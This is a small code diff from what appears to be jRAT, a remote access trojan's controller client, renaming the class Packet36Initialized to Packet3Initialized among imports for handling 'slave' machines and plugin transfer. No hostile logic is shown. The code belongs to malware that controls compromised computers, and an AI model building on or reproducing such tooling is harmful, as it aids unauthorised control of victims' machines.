@@ -20,7 +20,7 @@ import se.jrat.client.packets.outgoing.Packet101TransferPlugin;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.settings.StoreOfflineSlaves;
 
-public class Packet36Initialized extends AbstractIncomingPacket {
+public class Packet3Initialized extends AbstractIncomingPacket {
 
 	@Override
 	public void read(final Slave slave, DataInputStream dis) throws Exception {
